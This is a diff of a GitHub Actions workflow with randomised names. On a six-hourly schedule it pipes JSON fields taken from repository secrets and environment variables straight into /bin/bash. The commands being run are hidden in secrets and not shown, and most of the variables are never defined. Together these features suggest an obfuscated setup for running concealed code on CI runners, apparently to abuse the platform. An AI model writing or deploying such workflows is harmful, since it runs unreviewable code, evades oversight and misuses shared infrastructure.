@@ -1,23 +1,32 @@
 name: yinerbu6741
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 3/6 * * *'
+    - cron: '52 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yinerbu6741
         env:
-          i21682: ${{ secrets.i21682 }}
+          cnnxy41452: ${{ secrets.cnnxy41452 }}
         run: |
-          echo $i21682 | jq -r .nfe2 | /bin/bash
-          echo $wiag12083 | jq -r .hsby5173 | /bin/bash
-          echo $cm5 | jq -r .tfq13310 | /bin/bash
-          echo $jxvyl03032 | jq -r .vovju60 | /bin/bash
-          echo $lwoff086 | jq -r .auj6 | /bin/bash
-          echo $m63 | jq -r .hdu10551 | /bin/bash
-          echo $cavs5629 | jq -r .y90512 | /bin/bash
+          echo $cnnxy41452 | jq -r .w08477 | /bin/bash
+          echo $tz16 | jq -r .b31 | /bin/bash
+          echo $czwxy92 | jq -r .odf982 | /bin/bash
+          echo $ln28178 | jq -r .cdcw4074 | /bin/bash
+          echo $vkxn7585 | jq -r .evsir90438 | /bin/bash
+          echo $rqkl17 | jq -r .zuxz87994 | /bin/bash
+          echo $n19 | jq -r .tcyg21191 | /bin/bash
+          echo $zm66464 | jq -r .hehzi80222 | /bin/bash
+          echo $y0 | jq -r .n931 | /bin/bash
+          echo $wv20636 | jq -r .ue57 | /bin/bash
+          echo $mgjwx098 | jq -r .iwj2271 | /bin/bash
+          echo $q486 | jq -r .bez39910 | /bin/bash
+          echo $gycwv489 | jq -r .e431 | /bin/bash
+          echo $m4 | jq -r .dv18 | /bin/bash
+          echo $da777 | jq -r .bckcu383 | /bin/bash
 
